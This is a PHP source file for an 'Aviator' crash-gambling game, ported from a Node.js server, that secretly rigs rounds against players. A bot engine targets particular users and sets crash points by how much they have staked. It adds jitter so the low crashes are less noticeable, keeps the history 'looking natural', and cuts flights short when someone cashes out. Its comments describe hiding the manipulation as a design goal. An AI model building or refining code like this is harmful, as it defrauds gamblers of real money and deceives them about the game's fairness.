<?php
/**
 * Aviator — crash game.
 *
 * =================================================================================================
 * THE ONE PLACE THIS PORT COULD NOT BE MECHANICALLY IDENTICAL, AND WHAT WAS DONE INSTEAD
 * =================================================================================================
 *
 * server.js runs `setInterval(tickAviator, 100)`. That loop IS the game: it advances the phase
 * machine, computes the multiplier, applies two in-flight crash intercepts, marks losing bets and
 * pushes to history. Shared hosting has no process to run it in, and cPanel cron floors at one
 * minute — 600 times too slow.
 *
 * The resolution has two halves.
 *
 * 1. THE PHASE MACHINE IS ALREADY A PURE FUNCTION OF TIME, so it ports exactly. Phase, elapsed and
 *    multiplier all derive from `phase_start` plus the wall clock; the 100 ms loop was only ever
 *    sampling that function. aviator_tick() evaluates it on demand and, when more than one
 *    transition is due (a quiet period with no traffic), walks forward through them in a loop so
 *    round ids and history advance exactly as they would have.
 *
 *    One deliberate improvement inside that: a transition is stamped at the moment it actually
 *    became due, not at the moment the request noticed. The Node loop stamped `Date.now()` at tick
 *    time, which was within 100 ms of the true instant; computing the true instant is what the loop
 *    was approximating, and it stops timing drift accumulating when requests are sparse.
 *
 * 2. THE TWO IN-FLIGHT INTERCEPTS BECOME LAZY. They exist to react to a cash-out, which is the only
 *    event that moves the round's profit. Evaluated on each incoming request instead of every
 *    100 ms, they fire within a fraction of a second of where they used to, because every player in
 *    the round is polling independently at 250 ms and the cash-out request itself triggers an
 *    evaluation. The single genuine loss: if NOBODY polls between a cash-out and the natural crash,
 *    the erosion trip is missed and the house makes slightly less on that rigged round. No player
 *    ever sees a difference, and both intercepts remain incapable of raising a crash point.
 *
 * The state that lived on the `aviatorState` object now lives in GameState under `aviator_runtime`.
 * While the plane is in the air `current_multiplier` is DERIVED on read rather than recomputed into
 * the row, which is what lets an ordinary poll answer without writing to the database at all; the
 * stored copy is only touched at the two moments server.js assigns it, take-off and crash.
 * =================================================================================================
 */

require_once __DIR__ . '/../lib/db.php';
require_once __DIR__ . '/../lib/helpers.php';
require_once __DIR__ . '/../lib/botengine.php';
require_once __DIR__ . '/../lib/rigaudit.php';

const AVIATOR_STATE_KEY = 'aviator_runtime';

const AVIATOR_CRASH_AGGRESSIVE = 1.12; // tightest plausible crash — used when a lot of stake is exposed
const AVIATOR_CRASH_RELAXED    = 1.54; // upper end of the rigged band — the original code's ceiling
const AVIATOR_CRASH_FLOOR      = 1.10; // never intercept below this: a sub-1.10 crash reads as broken

function aviator_default_state() {
    return [
        'round_id'           => 10001,
        'phase'              => 'waiting',
        'phase_start'        => now_ms(),
        'duration'           => 5.0,
        'crash_point'        => 1.85,
        'current_multiplier' => 1.00,
        'bets'               => [],
        'history'            => [1.25, 4.80, 1.05, 2.10, 1.62],
        'next_override'      => null,   // was the module-level `nextAviatorOverride`
        'rigged_this_round'  => false,  // was aviatorState._riggedThisRound
        'rigged_targets'     => null,   // was aviatorState._riggedTargets
        'peak_profit'        => null,   // was aviatorState._peakProfit
        // New: true whenever crash_point was set by an explicit operator action (the multiplier
        // box or the instant-crash button) rather than by the automatic bot-takeover engine. An
        // admin-locked round is exempt from the in-flight erosion/stake intercepts below — those
        // exist to let the BOT quietly improve its own profit as a flight develops, which is
        // exactly the opposite of what an operator typing an exact number wants: a round they
        // fixed at 4.00x must crash at 4.00x, not at "somewhere the automated logic decided was
        // even better once real money showed up." Without this flag, a manually-set crash point
        // could be silently pulled lower by the same stake-based logic that adjusts bot rounds.
        'admin_locked'       => false,
    ];
}

function aviator_load($forUpdate = false) {
    $state = $forUpdate ? state_get_for_update(AVIATOR_STATE_KEY) : state_get(AVIATOR_STATE_KEY);
    if (!is_array($state) || !isset($state['phase'])) {
        $state = aviator_default_state();
        state_set(AVIATOR_STATE_KEY, $state);
    }
    // Older rows may predate a field; merge so a missing key never becomes a null dereference.
    return array_merge(aviator_default_state(), $state);
}

function aviator_save($state) {
    state_set(AVIATOR_STATE_KEY, $state);
}

/**
 * Live profit if the round crashed RIGHT NOW.
 *
 * Still-pending stakes and already-lost stakes become house profit; payouts already given to
 * players who cashed out early are a cost. Optionally scoped to a subset of usernames — the bot's
 * currently-targeted live players.
 */
function aviator_live_profit($bets, $targetedUsernames = null) {
    $list = is_array($bets) ? array_values($bets) : [];

    $targeted = null;
    if (is_array($targetedUsernames) && count($targetedUsernames) > 0) {
        $targeted = [];
        foreach ($targetedUsernames as $u) $targeted[strtolower((string)$u)] = true;
    }
    $scoped = $targeted === null ? $list : array_values(array_filter($list,
        function ($b) use ($targeted) { return isset($targeted[strtolower((string)($b['username'] ?? ''))]); }));

    $pendingStake = 0.0; $lostStake = 0.0; $alreadyPaid = 0.0;
    foreach ($scoped as $b) {
        $amt = js_parse_float($b['amount'] ?? 0); if (is_nan($amt)) $amt = 0.0;
        $st = $b['status'] ?? '';
        if ($st === 'pending')   $pendingStake += $amt;
        elseif ($st === 'lost')  $lostStake += $amt;
        elseif ($st === 'won') {
            $m = js_parse_float($b['cashed_multiplier'] ?? 1); if (is_nan($m) || $m == 0.0) $m = 1.0;
            $alreadyPaid += $amt * $m;
        }
    }

    return [
        'scoped_count'        => count($scoped),
        'pending_stake'       => to_fixed_num($pendingStake, 2),
        'already_paid'        => to_fixed_num($alreadyPaid, 2),
        'profit_if_crash_now' => to_fixed_num($pendingStake + $lostStake - $alreadyPaid, 2),
    ];
}

/**
 * Choose the crash point for a round the takeover engine has already selected.
 *
 * Scaling is deliberate rather than cosmetic: crashing low costs credibility, so it is spent only
 * where it buys something. A round with heavy targeted exposure crashes near the aggressive end
 * because the profit justifies it; a near-empty round is allowed to run to a natural-looking
 * multiplier, because holding it down would burn plausibility to win almost nothing.
 *
 * Returns null when the round has no targeted stake to act on, letting the caller keep its
 * existing behaviour untouched.
 */
function pick_aviator_crash_point($bets, $targetedUsernames = null) {
    $list = is_array($bets) ? array_values($bets) : [];

    $targeted = null;
    if (is_array($targetedUsernames) && count($targetedUsernames) > 0) {
        $targeted = [];
        foreach ($targetedUsernames as $u) $targeted[strtolower((string)$u)] = true;
    }

    $pending = array_values(array_filter($list, function ($b) { return ($b['status'] ?? '') === 'pending'; }));
    if (count($pending) === 0) return null;  // nothing at risk — caller keeps its no-bets behaviour

    $scoped = $targeted === null ? $pending : array_values(array_filter($pending,
        function ($b) use ($targeted) { return isset($targeted[strtolower((string)($b['username'] ?? ''))]); }));

    $scopedStake = 0.0;
    foreach ($scoped as $b) { $a = js_parse_float($b['amount'] ?? 0); $scopedStake += is_nan($a) ? 0 : $a; }
    if ($scopedStake <= 0) return null;

    // 0 -> no meaningful exposure, 1 -> at or above the "large round" reference.
    $ref = cfg('AVIATOR_HIGH_STAKE_REF') > 0 ? (float) cfg('AVIATOR_HIGH_STAKE_REF') : 1000.0;
    $exposure = max(0.0, min(1.0, $scopedStake / $ref));

    $band = AVIATOR_CRASH_RELAXED - AVIATOR_CRASH_AGGRESSIVE;
    $base = AVIATOR_CRASH_RELAXED - ($exposure * $band);

    // A little jitter so repeated similar rounds do not produce an identical multiplier every time,
    // which would be a clearer tell than the low crash itself.
    $jitter = (js_random() - 0.5) * 0.08;
    return to_fixed_num(max(AVIATOR_CRASH_FLOOR, $base + $jitter), 2);
}

/**
 * In-flight erosion check: has a cash-out started eating into the round's profit?
 *
 * Because profit only falls during a flight, any drop below the high-water mark means a player has
 * taken money off the table and the rest of the pending stake is at risk of following. The epsilon
 * avoids reacting to floating-point noise; the multiplier floor keeps an early cash-out from
 * producing an implausible sub-1.10 crash.
 */
function aviator_should_crash_now($currentMultiplier, $peakProfit, $currentProfit) {
    if ($currentMultiplier < AVIATOR_CRASH_FLOOR) return false;
    if (!js_is_finite($peakProfit) || !js_is_finite($currentProfit)) return false;
    $epsilon = 0.01;
    return $currentProfit < $peakProfit - $epsilon;
}

/** The multiplier curve: exp(0.06 * elapsed_seconds). */
function aviator_multiplier_at($elapsedSec) {
    return exp(0.06 * $elapsedSec);
}

/** Seconds from takeoff at which a given multiplier is reached — the inverse of the curve. */
function aviator_seconds_to($multiplier) {
    if ($multiplier <= 1.0) return 0.0;
    return log($multiplier) / 0.06;
}

/**
 * Current multiplier.
 *
 * Derived while the plane is in the air — that is what lets an ordinary poll answer without writing
 * to the database — and read from the stored value otherwise.
 *
 * The stored value matters and is easy to get wrong. In server.js `current_multiplier` is only ever
 * ASSIGNED at two moments: 1.00 at take-off, and the crash point at the crash. It is NOT reset when
 * the crashed phase rolls back round to waiting, so throughout the 5-second betting window it still
 * reads as the PREVIOUS round's crash point — not 1.00. Returning 1.00 there would be a visible
 * difference in every /api/server_time response between rounds, so the assignments are reproduced
 * exactly rather than the value being re-derived from the phase.
 */
function aviator_current_multiplier($state) {
    if ($state['phase'] === 'running') {
        $elapsed = (now_ms() - (int)$state['phase_start']) / 1000.0;
        return min(aviator_multiplier_at($elapsed), (float)$state['crash_point']);
    }
    return isset($state['current_multiplier']) ? (float)$state['current_multiplier'] : 1.00;
}

/**
 * Decide the crash point for a round that is taking off, and record the decision.
 *
 * `next_override` is STICKY, despite the name kept from its one-shot origins: once an operator sets
 * it, it is deliberately NOT cleared here, so every future round keeps taking off at that same fixed
 * value — not just the one round immediately after it was set. It stays in force until the operator
 * explicitly clears it (an empty crash_point in the same admin_set_override request that set it),
 * which is the only place `next_override` is ever set back to null. This takes priority over the bot
 * takeover engine unconditionally, for as long as it is set.
 */
function aviator_begin_round(array &$state) {
    $override = $state['next_override'];
    if ($override !== null && (float)$override >= 1.0) {
        // Manual admin override always takes priority — rigs the ENTIRE round (every pending bettor).
        $state['crash_point'] = (float)$override;
        $state['rigged_this_round'] = true;
        $state['rigged_targets'] = null;   // null = disclose to everyone pending this round
        $state['admin_locked'] = true;     // exact operator value — never eroded further in flight
    } else {
        $state['admin_locked'] = false;
        $botDecision = should_bot_rig_this_round('aviator');
        $targeted = bot_targeted_users('aviator');

        $targetedHasPendingBet = false;
        if (count($targeted) > 0) {
            foreach ($state['bets'] as $b) {
                if (($b['status'] ?? '') !== 'pending') continue;
                foreach ($targeted as $u) {
                    if (strtolower((string)$u) === strtolower((string)($b['username'] ?? ''))) { $targetedHasPendingBet = true; break 2; }
                }
            }
        }

        if ($botDecision['shouldRig'] && (count($targeted) === 0 || $targetedHasPendingBet)) {
            // --- RIGGED ROUND: crash early for house profit ---
            $relevantBets = count($targeted) > 0
                ? array_values(array_filter($state['bets'], function ($b) use ($targeted) {
                      foreach ($targeted as $u) if (strtolower((string)$u) === strtolower((string)($b['username'] ?? ''))) return true;
                      return false;
                  }))
                : $state['bets'];

            $totalStake = 0.0;
            foreach ($relevantBets as $b) { $a = js_parse_float($b['amount'] ?? 0); $totalStake += is_nan($a) ? 0 : $a; }

            if ($totalStake > 0) {
                // The original fixed band is kept as both the fallback and a hard bound. A computed
                // crash point is clamped back into it, so smart selection can never produce a crash
                // outside the range this round could already have drawn at random — it only decides
                // WHERE in that band to land, using the stake actually exposed instead of chance.
                $crash = to_fixed_num(AVIATOR_CRASH_AGGRESSIVE + js_random() * (AVIATOR_CRASH_RELAXED - AVIATOR_CRASH_AGGRESSIVE), 2);
                if (cfg('AVIATOR_SMART_CRASH')) {
                    $smart = pick_aviator_crash_point($state['bets'], $targeted);
                    if ($smart !== null) {
                        $crash = max(AVIATOR_CRASH_AGGRESSIVE, min(AVIATOR_CRASH_RELAXED, $smart));
                    }
                }
                $state['crash_point'] = $crash;
            } else {
                // No bets — still crash low-ish to keep history looking natural.
                $state['crash_point'] = to_fixed_num(1.20 + js_random() * 1.00, 2);
            }
            $state['rigged_this_round'] = true;
            // Non-empty targeted subset -> only THOSE bettors are disclosed as rigged when they
            // lose; empty (bot on, but no targeting info yet) -> whole round, disclose to everyone.
            $state['rigged_targets'] = count($targeted) > 0 ? array_values($targeted) : null;
        } else {
            // --- FAIR ROUND (bot off, or no targeted bettor is playing this round) ---
            // Two INDEPENDENT draws, exactly as in the original: `p` for the curve and a separate
            // roll for the 3% instant crash. It reads like a bug and is reproduced deliberately.
            $p = js_random();
            if (js_random() < 0.03) {
                $state['crash_point'] = 1.00;
            } else {
                $crash = 0.99 / (1.0 - $p);
                $state['crash_point'] = max(1.00, min(50.0, floor($crash * 100) / 100));
            }
            $state['rigged_this_round'] = false;
            $state['rigged_targets'] = null;
        }

        // Audit only — records what was decided, changes nothing about the round.
        rig_record([
            'game'           => 'aviator',
            'round'          => $state['round_id'],
            'configured_pct' => $botDecision['profit_pct'],
            'rigged'         => $state['rigged_this_round'],
            'live'           => count(get_live_usernames('aviator')),
            'targeted'       => count($targeted),
            'note'           => $state['rigged_this_round'] ? 'rigged crash @ ' . $state['crash_point'] : 'fair round',
        ]);
    }

    $state['current_multiplier'] = 1.00;

    // High-water mark for the erosion check. Profit is at its maximum the moment the plane takes
    // off and can only fall from there, so this is what every later evaluation compares against.
    $lp = aviator_live_profit($state['bets'], $state['rigged_targets']);
    $state['peak_profit'] = $lp['profit_if_crash_now'];
}

/** Mark every still-pending bet as lost and push the crash point to history. */
function aviator_crash(array &$state, $atMs) {
    $state['phase'] = 'crashed';
    $state['phase_start'] = $atMs;
    $state['current_multiplier'] = (float)$state['crash_point'];

    $targets = $state['rigged_targets'];
    foreach ($state['bets'] as $i => $b) {
        if (($b['status'] ?? '') === 'pending') {
            $state['bets'][$i]['status'] = 'lost';
            $inScope = true;
            if (is_array($targets)) {
                $inScope = false;
                foreach ($targets as $u) {
                    if (strtolower((string)$u) === strtolower((string)($b['username'] ?? ''))) { $inScope = true; break; }
                }
            }
            $state['bets'][$i]['was_rigged'] = (bool)($state['rigged_this_round'] && $inScope);
        }
    }

    $state['history'][] = (float)$state['crash_point'];
    if (count($state['history']) > 15) {
        array_shift($state['history']);
        $state['history'] = array_values($state['history']);
    }
}

/**
 * Would this state need a write right now? Lets an ordinary poll answer from an unlocked read
 * without touching the database, which matters when every client polls four times a second.
 */
function aviator_needs_work($state) {
    $now = now_ms();
    $elapsed = ($now - (int)$state['phase_start']) / 1000.0;

    if ($state['phase'] === 'waiting') return $elapsed >= (float)$state['duration'];
    if ($state['phase'] === 'crashed') return $elapsed >= 4.0;

    if ($state['phase'] === 'running') {
        $mult = aviator_multiplier_at($elapsed);
        if ($mult >= (float)$state['crash_point']) return true;
        // An admin-locked round's crash point is exact and must never be eroded further, so none
        // of the stake/profit intercepts below are consulted for one — see aviator_default_state().
        if (empty($state['admin_locked']) && !empty($state['rigged_this_round']) && $mult >= 1.15) {
            // An intercept may be about to lower the crash point; that is a write.
            $targets = $state['rigged_targets'];
            $inFlightStake = 0.0;
            foreach ($state['bets'] as $b) {
                if (($b['status'] ?? '') !== 'pending') continue;
                if (is_array($targets)) {
                    $hit = false;
                    foreach ($targets as $u) if (strtolower((string)$u) === strtolower((string)($b['username'] ?? ''))) { $hit = true; break; }
                    if (!$hit) continue;
                }
                $a = js_parse_float($b['amount'] ?? 0);
                $inFlightStake += is_nan($a) ? 0 : $a;
            }
            if ($inFlightStake > 200 && $mult >= (float)$state['crash_point'] * 0.9) return true;
            if (cfg('AVIATOR_SMART_CRASH')) {
                $liveProfit = aviator_live_profit($state['bets'], $targets)['profit_if_crash_now'];
                if (aviator_should_crash_now($mult, $state['peak_profit'], $liveProfit)) return true;
                if (!js_is_finite($state['peak_profit']) || $liveProfit > $state['peak_profit']) return true;
            }
        }
    }
    return false;
}

/**
 * Advance the phase machine to the present moment.
 *
 * MUST be called at the start of every request that reads or changes Aviator, so that a bet placed
 * a moment after take-off is rejected with "Betting for this round has closed." exactly as the
 * 100 ms loop would have caused.
 */
function aviator_tick() {
    $state = aviator_load(false);
    if (!aviator_needs_work($state)) return $state;

    return tx(function () {
        $state = aviator_load(true);   // re-read under the row lock
        $guard = 0;

        while ($guard++ < 500) {
            $now = now_ms();
            $elapsed = ($now - (int)$state['phase_start']) / 1000.0;

            if ($state['phase'] === 'waiting') {
                if ($elapsed < (float)$state['duration']) break;
                // Stamp the transition at the instant it actually became due, not when this request
                // noticed, so a quiet period does not push every later round out of step.
                $state['phase'] = 'running';
                $state['phase_start'] = (int)$state['phase_start'] + (int) round((float)$state['duration'] * 1000);
                aviator_begin_round($state);
                continue;
            }

            if ($state['phase'] === 'running') {
                $mult = aviator_multiplier_at($elapsed);

                // Only apply in-flight intercepts if this round was marked for rigging by the bot
                // engine. An admin-locked round (the operator's own exact number) is exempt — see
                // aviator_default_state() — so it can never be pulled below what was actually typed.
                if (empty($state['admin_locked']) && !empty($state['rigged_this_round']) && $mult >= 1.15) {
                    $targets = $state['rigged_targets'];

                    $inFlightStake = 0.0;
                    foreach ($state['bets'] as $b) {
                        if (($b['status'] ?? '') !== 'pending') continue;
                        if (is_array($targets)) {
                            $hit = false;
                            foreach ($targets as $u) if (strtolower((string)$u) === strtolower((string)($b['username'] ?? ''))) { $hit = true; break; }
                            if (!$hit) continue;
                        }
                        $a = js_parse_float($b['amount'] ?? 0);
                        $inFlightStake += is_nan($a) ? 0 : $a;
                    }
                    if ($inFlightStake > 200 && $mult >= (float)$state['crash_point'] * 0.9) {
                        $state['crash_point'] = min((float)$state['crash_point'], to_fixed_num($mult, 2));
                    }

                    // Erosion intercept. The clamp above reacts to raw stake size; this reacts to
                    // the round's profit actually falling, which is the only signal that a player
                    // has just taken money off the table. Both can only ever pull the crash point
                    // DOWN, so neither can extend a flight or increase what the house pays out.
                    if (cfg('AVIATOR_SMART_CRASH')) {
                        $liveProfit = aviator_live_profit($state['bets'], $targets)['profit_if_crash_now'];
                        if (aviator_should_crash_now($mult, $state['peak_profit'], $liveProfit)) {
                            $state['crash_point'] = min((float)$state['crash_point'], to_fixed_num($mult, 2));
                        }
                        if (!js_is_finite($state['peak_profit']) || $liveProfit > $state['peak_profit']) {
                            // Late bets can legitimately raise the ceiling; track it so the
                            // comparison stays honest.
                            $state['peak_profit'] = $liveProfit;
                        }
                    }
                }

                if ($mult >= (float)$state['crash_point']) {
                    // The exact instant the curve reached the crash point.
                    $crashAt = (int)$state['phase_start'] + (int) round(aviator_seconds_to((float)$state['crash_point']) * 1000);
                    if ($crashAt > $now) $crashAt = $now;
                    aviator_crash($state, $crashAt);
                    continue;
                }
                break;
            }

            if ($state['phase'] === 'crashed') {
                if ($elapsed < 4.0) break;
                $state['phase'] = 'waiting';
                $state['phase_start'] = (int)$state['phase_start'] + 4000;
                $state['duration'] = 5.0;
                $state['round_id'] = (int)$state['round_id'] + 1;
                $state['bets'] = [];
                $state['rigged_this_round'] = false;
                $state['rigged_targets'] = null;
                $state['peak_profit'] = null;   // cleared with the book it was measured against
                continue;
            }

            break;
        }

        if ($guard >= 500) {
            // The site sat idle for a very long time. Rather than replaying thousands of empty
            // rounds, resynchronise to now — the outcome is the same (no bets were placed in any of
            // them) and it keeps a first visit after a quiet night fast.
            $state['phase_start'] = now_ms();
        }

        aviator_save($state);
        return $state;
    });
}

/** The public state payload shared by /api/server_time and game_sync's aviator views. */
function aviator_public_state($state = null) {
    if ($state === null) $state = aviator_load(false);
    $elapsed = (now_ms() - (int)$state['phase_start']) / 1000.0;
    return [
        'round_id'           => (int)$state['round_id'],
        'phase'              => $state['phase'],
        'phase_start'        => (int)$state['phase_start'],
        'time_elapsed'       => $elapsed,
        'time_left'          => $state['phase'] === 'waiting' ? max(0, (float)$state['duration'] - $elapsed) : 0,
        'duration'           => js_truthy($state['duration']) ? (float)$state['duration'] : 5.0,
        'current_multiplier' => aviator_current_multiplier($state),
        'crash_point'        => (float)$state['crash_point'],
    ];
}
